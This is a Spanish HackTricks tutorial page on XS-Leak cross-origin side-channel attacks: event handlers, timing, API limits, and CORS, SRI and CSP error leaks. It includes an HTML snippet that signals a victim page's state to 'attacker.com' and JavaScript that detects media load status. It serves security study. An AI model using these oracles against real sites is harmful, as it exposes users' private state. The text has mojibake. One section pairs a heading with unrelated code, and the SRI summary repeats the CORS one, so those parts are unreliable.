# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** con las herramientas comunitarias **m√°s avanzadas** del mundo.\
Obt√©n acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta ser un h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Informaci√≥n B√°sica**

XS-Search es una t√©cnica orientada a **exfiltrar informaci√≥n de origen cruzado** abusando de **ataques de canal lateral**.

Hay diferentes elementos en este tipo de ataque:

* **Web Vulnerable**: Es la web de la que queremos exfiltrar informaci√≥n.
* **Web del Atacante**: Es la web que el atacante crea conteniendo el exploit y a la que accede la v√≠ctima.
* **M√©todo de Inclusi√≥n**: Es el m√©todo utilizado para cargar la Web Vulnerable desde la Web del Atacante (como window.open, iframe, fetch, etiqueta HTML con href...).
* **T√©cnica de Leak**: Despu√©s de acceder a la web vulnerable, se utilizar√° una t√©cnica para diferenciar entre los posibles estados de la web con la informaci√≥n obtenida del m√©todo de inclusi√≥n utilizado.
* **Estados**: Los 2 posibles estados que la web vulnerable puede tener dependiendo de la v√≠ctima que queremos diferenciar.
* **Diferencias Detectables**: Esta es la informaci√≥n que el atacante tiene que intentar decidir el estado de la web vulnerable.

### Diferencias Detectables

Para distinguir entre los 2 estados de la p√°gina vulnerable se pueden observar varias cosas:

* **C√≥digo de Estado**. Un atacante puede distinguir **diferentes c√≥digos de estado de respuesta HTTP** de origen cruzado (por ejemplo, errores de servidor, errores de cliente o errores de autenticaci√≥n).
* **Uso de API**. Esta diferencia detectable permite a un atacante detectar el **uso de APIs Web** entre p√°ginas, permiti√©ndole inferir si una p√°gina de origen cruzado est√° utilizando una API Web de JavaScript espec√≠fica.
* **Redirecciones**. Es posible detectar si una aplicaci√≥n web ha **navegado al usuario a una p√°gina diferente**. Esto no se limita a redirecciones HTTP, sino que tambi√©n incluye redirecciones activadas por JavaScript o HTML.
* **Contenido de la P√°gina**. Estas diferencias detectables **aparecen en el cuerpo de la respuesta HTTP** o en sub-recursos incluidos por la p√°gina. Por ejemplo, esto podr√≠a ser el **n√∫mero de frames incluidos** (cf. XS-Leak en Gitlab) o diferencias de tama√±o de im√°genes.
* **Encabezado HTTP**. Un atacante puede detectar la presencia de un **encabezado de respuesta HTTP espec√≠fico** y puede ser capaz de recopilar su valor. Esto incluye encabezados como X-Frame-Options, Content-Disposition y Cross-Origin-Resource-Policy.
* **Tiempo**: Un atacante puede detectar que existe una diferencia de tiempo consistente entre 2 estados.

### M√©todos de Inclusi√≥n

* **Elementos HTML**. HTML ofrece una variedad de elementos que permiten la **inclusi√≥n de recursos de origen cruzado**. Elementos como hojas de estilo, im√°genes o scripts, obligan al navegador de la v√≠ctima a solicitar un recurso no HTML especificado. Hay una lista que enumera posibles elementos HTML para este prop√≥sito disponible en l√≠nea ([https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks)).
* **Frames**. Elementos como **iframe**, **object** y **embed** pueden incrustar recursos HTML directamente en la p√°gina del atacante. Si la p√°gina **no utiliza protecci√≥n contra frames**, el c√≥digo JavaScript puede acceder al objeto window del recurso enmarcado a trav√©s de la propiedad contentWindow.
* **Pop-ups**. El m√©todo **`window.open`** carga un recurso en una nueva pesta√±a o ventana del navegador. El m√©todo devuelve un **manejador de ventana** que el c√≥digo JavaScript puede usar para acceder a m√©todos y propiedades, que cumplen con la SOP. Estos llamados pop-ups se utilizan a menudo en el inicio de sesi√≥n √∫nico. Los navegadores modernos solo permiten pop-ups si son activados por ciertas interacciones del usuario. Para los ataques XS-Leak, este m√©todo es especialmente √∫til porque **evita las restricciones de framing y cookies para un recurso objetivo**. Las versiones m√°s recientes de los navegadores agregaron recientemente medios para aislar los manejadores de ventanas.
* **Solicitudes JavaScript**. JavaScript permite enviar solicitudes directamente a recursos objetivo. Hay dos formas diferentes para este prop√≥sito: **XMLHttpRequests** y su sucesor **Fetch API**. A diferencia de los m√©todos de inclusi√≥n anteriores, un atacante tiene un control detallado sobre la solicitud emitida, por ejemplo, si se debe seguir autom√°ticamente una redirecci√≥n HTTP.

### T√©cnicas de Leak

* **Manejador de Eventos**. El manejador de eventos puede considerarse como la t√©cnica cl√°sica de leak para XS-Leaks. Son una fuente bien conocida de varias piezas de informaci√≥n. Por ejemplo, el disparo de **onload** indica una carga de recurso **exitosa** en contraste con el evento onerror.
* **Mensajes de Error**. M√°s all√° de los manejadores de eventos, los mensajes de error pueden ocurrir como **excepciones de JavaScript** y **p√°ginas de error especiales**. Los mensajes de error pueden ser lanzados en diferentes pasos, por ejemplo, directamente por la t√©cnica de leak. La t√©cnica de leak puede usar informaci√≥n **adicional** directamente **contenida** en el **mensaje de error**, o distinguir entre la **aparici√≥n y ausencia de un mensaje de error**.
* **L√≠mites Globales**. Cada computadora tiene sus l√≠mites f√≠sicos, lo mismo ocurre con un navegador. Por ejemplo, la cantidad de memoria disponible limita las pesta√±as en ejecuci√≥n de un navegador. Lo mismo ocurre con otros l√≠mites del navegador que se aplican a todo el navegador. Si un atacante puede determinar **cu√°ndo se alcanza el l√≠mite, esto se puede usar como una t√©cnica de leak**.
* **Estado Global**. Los navegadores tienen **estados globales con los que todas las p√°ginas pueden interactuar**. Si esta interacci√≥n es detectable desde el sitio web del atacante, se puede usar como una t√©cnica de leak. Por ejemplo, la interfaz **History** permite la manipulaci√≥n de las p√°ginas visitadas en una pesta√±a o frame. Esto crea un estado global porque el **n√∫mero de entradas** permite a un atacante sacar conclusiones sobre p√°ginas de origen cruzado.
* **API de Rendimiento**. La API de Rendimiento se utiliza para acceder a la **informaci√≥n de rendimiento de la p√°gina actual**. Sus entradas incluyen datos detallados de tiempo de red para el documento y cada recurso cargado por la p√°gina. Esto permite a un atacante sacar **conclusiones sobre los recursos solicitados**. Por ejemplo, identificamos casos en los que los navegadores no crear√°n entradas de rendimiento para algunas solicitudes.
* **Atributos Legibles**. HTML tiene varios **atributos que son legibles de origen cruzado**. Este acceso de lectura se puede usar como una t√©cnica de leak. Por ejemplo, el c√≥digo JavaScript puede leer el n√∫mero de frames incluidos en una p√°gina web de origen cruzado con la propiedad window.frame.length.

#### **T√©cnicas basadas en tiempo**

Algunas de las siguientes t√©cnicas van a usar el tiempo como parte del proceso para detectar diferencias en los posibles estados de las p√°ginas web. Hay diferentes formas de medir el tiempo en un navegador web.

**Relojes**: La API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) permite a los desarrolladores obtener mediciones de tiempo de alta resoluci√≥n.\
Hay un n√∫mero considerable de APIs que los atacantes pueden abusar para crear relojes impl√≠citos: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), animaciones CSS y otros.\
Para m√°s informaci√≥n: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## XSinator

XSinator es una herramienta autom√°tica para **comprobar navegadores contra varios XS-Leaks conocidos** explicados en su art√≠culo: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)\
Puedes acceder a la herramienta en [https://xsinator.com/](https://xsinator.com/)

{% hint style="warning" %}
**XS-Leaks Excluidos**: Tuvimos que excluir XS-Leaks que dependen de **service workers** ya que interferir√≠an con otros leaks en XSinator. Adem√°s, elegimos **excluir XS-Leaks que dependen de la mala configuraci√≥n y errores en una aplicaci√≥n web espec√≠fica**. Por ejemplo, configuraciones err√≥neas de CrossOrigin Resource Sharing (CORS), fugas de postMessage o Cross-Site Scripting. Adem√°s, excluimos XS-Leaks basados en tiempo ya que a menudo sufren de ser lentos, ruidosos e inexactos.
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** con las herramientas comunitarias **m√°s avanzadas** del mundo.\
Obt√©n acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## T√©cnicas de Manejador de Eventos

### Onload/Onerror

* **M√©todos de Inclusi√≥n**: Frames, Elementos HTML
* **Diferencia Detectable**: C√≥digo de Estado
* **M√°s informaci√≥n**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Resumen**: si al intentar cargar un recurso se activan los eventos onerror/onload cuando el recurso se carga con √©xito/fracaso, es posible determinar el c√≥digo de estado.
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

El ejemplo de c√≥digo intenta **cargar objetos de scripts desde JS**, pero tambi√©n se podr√≠an usar **otras etiquetas** como objetos, hojas de estilo, im√°genes, audios. Adem√°s, tambi√©n es posible inyectar la **etiqueta directamente** y declarar los eventos `onload` y `onerror` dentro de la etiqueta (en lugar de inyectarla desde JS).

Tambi√©n existe una versi√≥n de este ataque sin scripts:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
En este caso, si `example.com/404` no se encuentra, se cargar√° `attacker.com/?error`.

### Tiempo de Carga Onload

* **M√©todos de Inclusi√≥n**: Elementos HTML
* **Diferencia Detectable**: Tiempo (generalmente debido al Contenido de la P√°gina, C√≥digo de Estado)
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Resumen**: La API [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) se puede utilizar para medir cu√°nto tiempo toma realizar una solicitud. Sin embargo, se podr√≠an usar otros relojes, como la API [**PerformanceLongTaskTiming**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) que puede identificar tareas que se ejecutan por m√°s de 50 ms.
* **Ejemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) otro ejemplo en:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Tiempo de Carga Onload + Tarea Pesada Forzada

Esta t√©cnica es como la anterior, pero el **atacante** tambi√©n **forzar√°** alguna acci√≥n para que tome un **tiempo relevante** cuando la **respuesta sea positiva o negativa** y medir ese tiempo.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### Tiempo de Descarga/unload/beforeunload

* **M√©todos de Inclusi√≥n**: Marcos (Frames)
* **Diferencia Detectable**: Tiempo (generalmente debido al Contenido de la P√°gina, C√≥digo de Estado)
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Resumen**: El reloj [SharedArrayBuffer](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) se puede utilizar para medir cu√°nto tiempo toma realizar una solicitud. Se podr√≠an usar otros relojes.
* **Ejemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Los eventos [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) y [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event) se pueden utilizar para medir el tiempo que toma obtener un recurso. Esto funciona porque **`beforeunload`** se activa cuando el navegador **solicita una nueva navegaci√≥n**, mientras que **`unload`** se activa cuando esa **navegaci√≥n realmente ocurre**. Debido a este comportamiento, es posible calcular la diferencia de tiempo entre estos dos eventos y medir el **tiempo que tard√≥ el navegador en completar la obtenci√≥n del recurso**.

### Tiempo de Carga de Marco Aislado (Sandboxed) + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **M√©todos de Inclusi√≥n**: Marcos (Frames)
* **Diferencia Detectable**: Tiempo (generalmente debido al Contenido de la P√°gina, C√≥digo de Estado)
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Resumen**: La API [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) se puede utilizar para medir cu√°nto tiempo toma realizar una solicitud. Se podr√≠an usar otros relojes.
* **Ejemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Si una p√°gina no tiene [Protecciones de Enmarcado](https://xsleaks.dev/docs/defenses/opt-in/xfo/) implementadas, un atacante puede medir cu√°nto tiempo toma cargar la p√°gina y todos los subrecursos a trav√©s de la red. Por defecto, el manejador `onload` para un iframe se invoca despu√©s de que todos los recursos se han cargado y todo el JavaScript ha terminado de ejecutarse. Pero, un atacante puede eliminar el ruido de la ejecuci√≥n de scripts incluyendo el atributo [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) en el `<iframe>`. Este atributo bloquea muchas caracter√≠sticas incluyendo la ejecuci√≥n de JavaScript, lo que resulta en una medici√≥n de red casi pura.

### #ID + error + onload

* **M√©todos de Inclusi√≥n**: Marcos (Frames)
* **Diferencia Detectable**: Contenido de la P√°gina
* **M√°s informaci√≥n**:
* **Resumen**: Si puedes hacer que la p√°gina de error cuando se accede al contenido correcto y hacer que se cargue correctamente cuando se accede a cualquier contenido, entonces puedes hacer un bucle para extraer toda la informaci√≥n sin medir el tiempo.
* **Ejemplo de C√≥digo**:

Supongamos que puedes **insertar** la **p√°gina** que tiene el contenido **secreto dentro de un Iframe**.

Puedes **hacer que la v√≠ctima busque** el archivo que contiene "_**flag**_" usando un **Iframe** (explotando un CSRF, por ejemplo). Dentro del Iframe sabes que el _**evento onload**_ se **ejecutar√° siempre al menos una vez**. Entonces, puedes **cambiar** la **URL** del **iframe** pero cambiando solo el **contenido** del **hash** dentro de la URL.

Por ejemplo:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Si la primera URL se **carg√≥ con √©xito**, entonces, al **cambiar** la parte del **hash** de la URL el evento **onload** **no se activar√°** nuevamente. Pero **si** la p√°gina tuvo alg√∫n tipo de **error** al **cargarse**, entonces, el evento **onload** se **activar√° nuevamente**.

Entonces, puedes **distinguir entre** una p√°gina cargada **correctamente** o una p√°gina que tiene un **error** cuando se accede.

### Ejecuci√≥n de Javascript

* **M√©todos de Inclusi√≥n**: Marcos (Frames)
* **Diferencia Detectable**: Contenido de la P√°gina
* **M√°s informaci√≥n**:
* **Resumen**: Si la **p√°gina** est√° **devolviendo** el contenido **sensible**, **o** un contenido que puede ser **controlado** por el usuario. El usuario podr√≠a establecer **c√≥digo JS v√°lido en el caso negativo**, y **cargar** cada intento dentro de etiquetas **`<script>`**, as√≠ que en casos **negativos** el c√≥digo del atacante **se ejecuta**, y en casos **afirmativos** **nada** se ejecutar√°.
* **Ejemplo de C√≥digo**:

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **M√©todos de Inclusi√≥n**: Elementos HTML
* **Diferencia Detectable**: C√≥digo de Estado y Encabezados
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Resumen**: Los atacantes pueden observar cuando se aplica CORB si una respuesta devuelve un `Content-Type` _protegido por CORB_ (y `nosniff`) con el c√≥digo de estado `2xx` lo que resulta en que CORB elimine el cuerpo y los encabezados de la respuesta. Detectar esta protecci√≥n permite al atacante **filtrar** la combinaci√≥n de ambos, el **c√≥digo de estado** (√©xito vs. error) y el **`Content-Type` (protegido por CORB o no).**
* **Ejemplo de C√≥digo**:

Consulta el enlace de m√°s informaci√≥n para m√°s detalles sobre el ataque.

### onblur

* **M√©todos de Inclusi√≥n**: Marcos (Frames)
* **Diferencia Detectable**: Contenido de la P√°gina
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Resumen**: Filtrar datos sensibles del atributo id o name.
* **Ejemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Es posible **cargar una p√°gina** dentro de un **iframe** y usar el **`#id_value`** para hacer que la p√°gina **se enfoque en el elemento** del iframe con el id indicado, entonces si se activa una se√±al de **`onblur`**, el elemento ID existe.\
Puedes realizar el mismo ataque con etiquetas **`portal`**.

### Difusiones de postMessage <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **M√©todos de Inclusi√≥n**: Marcos (Frames), Pop-ups
* **Diferencia Detectable**: Uso de API
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Resumen**: Recopilar informaci√≥n sensible de un postMessage o usar la presencia de postMessages como un or√°culo para conocer el estado del usuario en la p√°gina
* **Ejemplo de C√≥digo**: `Cualquier c√≥digo que escuche todos los postMessages.`

Las aplicaciones a menudo usan [difusiones de postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) para compartir informaci√≥n con otros or√≠genes. Escuchando estos mensajes se podr√≠a encontrar **informaci√≥n sensible** (potencialmente si el par√°metro `targetOrigin` no se utiliza). Adem√°s, el hecho de recibir alg√∫n mensaje puede ser **utilizado como un or√°culo** (solo recibes este tipo de mensaje si est√°s conectado).

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente con las herramientas comunitarias **m√°s avanzadas** del mundo.\
Obt√©n Acceso Hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## T√©cnicas de L√≠mites Globales

### API de WebSocket

* **M√©todos de Inclusi√≥n**: Marcos (Frames), Pop-ups
* **Diferencia Detectable**: Uso de API
* **M√°s informaci√≥n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Resumen**: Agotar el l√≠mite de conexiones WebSocket filtra el n√∫mero de conexiones WebSocket de una p√°gina de origen cruzado.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

Es posible identificar si, y cu√°ntas, **conexiones WebSocket utiliza una p√°gina objetivo**. Permite a un atacante detectar estados de aplicaci√≥n y filtrar informaci√≥n relacionada con el n√∫mero de conexiones WebSocket.

Si un **origen** utiliza la **cantidad m√°xima de objetos de conexi√≥n WebSocket**, independientemente de su estado de conexi√≥n, la creaci√≥n de **nuevos objetos resultar√° en excepciones de JavaScript**. Para ejecutar este ataque, el sitio web del atacante abre el sitio web objetivo en un pop-up o iframe y luego, despu√©s de que la web objetivo se haya cargado, intenta crear el n√∫mero m√°ximo de conexiones WebSocket posibles. El **n√∫mero de excepciones lanzadas** es el **n√∫mero de conexiones WebSocket utilizadas por la ventana del sitio web objetivo**.

### API de Pago

* **M√©todos de Inclusi√≥n**: Marcos (Frames), Pop-ups
* **Diferencia Detectable**: Uso de API
* **M√°s informaci√≥n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Resumen**: Detectar Solicitud de Pago porque solo una puede estar activa a la vez.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Este XS-Leak permite a un atacante **detectar cu√°ndo una p√°gina de origen cruzado inicia una solicitud de pago**.

Debido a que **solo se puede activar una solicitud de pago a la vez**, si el sitio web objetivo est√° utilizando la API de Solicitud de Pago, cualquier **intento posterior de mostrar esta API fallar√°** y causar√° una **excepci√≥n de JavaScript**. El atacante puede explotar esto **intentando peri√≥dicamente mostrar la interfaz de usuario de la API de Pago**. Si un intento causa una excepci√≥n, el sitio web objetivo la est√° utilizando actualmente. El atacante puede ocultar estos intentos peri√≥dicos cerrando inmediatamente la interfaz de usuario despu√©s de su creaci√≥n.

### Medir el Bucle de Eventos <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **M√©todos de Inclusi√≥n**:
* **Diferencia Detectable**: Tiempo (generalmente debido al Contenido de la P√°gina, C√≥digo de Estado)
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Resumen**: Medir el tiempo de ejecuci√≥n de una web abusando del bucle de eventos JS de un solo hilo.
* **Ejemplo de C√≥digo**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

El modelo de concurrencia de JavaScript se basa en un [bucle de eventos de un solo hilo](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) lo que significa que **solo puede ejecutar una tarea a la vez**.\
Inferir **cu√°nto tiempo tarda en ejecutarse el c√≥digo de un origen diferente** midiendo cu√°nto tiempo **tarda en ejecutarse a continuaci√≥n en el grupo de eventos**. El atacante sigue enviando eventos al bucle de eventos con propiedades fijas, que eventualmente se despachar√°n si el grupo est√° vac√≠o. Otros or√≠genes env√≠an eventos al mismo grupo, y aqu√≠ es donde un **atacante infiere la diferencia de tiempo detectando si ocurri√≥ un retraso con una de sus tareas**.

{% hint style="warning" %}
En un timing de ejecuci√≥n es posible **eliminar** **factores de red** para obtener **mediciones m√°s precisas**. Por ejemplo, cargando los recursos utilizados por la p√°gina antes de cargarla.
{% endhint %}

### Bucle de Eventos Ocupado <a href="#busy-event-loop" id="busy-event-loop"></a>

* **M√©todos de Inclusi√≥n**:
* **Diferencia Detectable**: Tiempo (generalmente debido al Contenido de la P√°gina, C√≥digo de Estado)
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Resumen**: Medir el tiempo de ejecuci√≥n de una web bloqueando el bucle de eventos de un hilo y midiendo **cu√°nto tiempo tarda el bucle de eventos en estar disponible nuevamente**.
* **Ejemplo de C√≥digo**:

Una de las principales ventajas de esta t√©cnica es su capacidad para eludir la Aislaci√≥n de Sitio, ya que un origen atacante puede influir en la ejecuci√≥n de otro origen.

{% hint style="warning" %}
En un timing de ejecuci√≥n es posible **eliminar** **factores de red** para obtener **mediciones m√°s precisas**. Por ejemplo, cargando los recursos utilizados por la p√°gina antes de cargarla.
{% endhint %}

### Grupo de Conexiones

* **M√©todos de Inclusi√≥n**: Solicitudes
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
### Error de CORS

* **M√©todos de Inclusi√≥n**: Fetch API
* **Diferencia Detectable**: Encabezado
* **M√°s informaci√≥n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Resumen:** En SA los mensajes de error de CORS revelan la URL completa de las redirecciones.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Esta t√©cnica permite a un atacante revelar el objetivo de una redirecci√≥n que es iniciada por un sitio de origen cruzado.

CORS permite que recursos web p√∫blicamente accesibles sean le√≠dos y utilizados desde cualquier sitio web. En navegadores basados en Webkit, es posible **acceder a mensajes de error de CORS cuando una solicitud CORS falla**. Un atacante puede enviar una solicitud habilitada para CORS a un sitio objetivo que **redirige** basado en el estado del usuario. Cuando el navegador niega la solicitud, la **URL completa del objetivo de la redirecci√≥n se revela** en el mensaje de error. Con este ataque, es posible detectar redirecciones, revelar ubicaciones de redirecci√≥n y par√°metros de consulta sensibles.

### Error de SRI

* **M√©todos de Inclusi√≥n**: Fetch API
* **Diferencia Detectable**: Encabezado
* **M√°s informaci√≥n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Resumen:** En SA los mensajes de error de CORS revelan la URL completa de las redirecciones.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Un atacante puede revelar el tama√±o de las respuestas de origen cruzado debido a **mensajes de error detallados**.

El atributo de integridad define un hash criptogr√°fico por el cual el navegador puede verificar que un recurso obtenido no ha sido manipulado. Este mecanismo de seguridad se llama Integridad de Subrecursos (SRI). Se utiliza para la verificaci√≥n de integridad de recursos servidos desde redes de entrega de contenido (CDNs). Para prevenir fugas de datos, los recursos de origen cruzado deben ser **habilitados para CORS**. De lo contrario, la respuesta no es elegible para validaci√≥n de integridad. Similar al error de CORS en XS-Leak, es posible capturar el **mensaje de error despu√©s de que una solicitud fetch con un atributo de integridad falla**. Un atacante puede forzar **intencionalmente** este **error** en cualquier solicitud especificando un **valor de hash falso**. En SA, este mensaje de error revela la longitud del contenido del recurso solicitado. Un atacante puede usar esta fuga para detectar diferencias en el tama√±o de la respuesta, lo que permite ataques de XS-Leak potentes.

### Violaci√≥n/Detecci√≥n de CSP

* **M√©todos de Inclusi√≥n**: Pop-ups
* **Diferencia Detectable**: C√≥digo de Estado
* **M√°s informaci√≥n**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Resumen:** Permitiendo solo el sitio web de las v√≠ctimas en el CSP si intentamos acceder a √©l intenta redirigir a un dominio diferente, el CSP activar√° un error detectable.
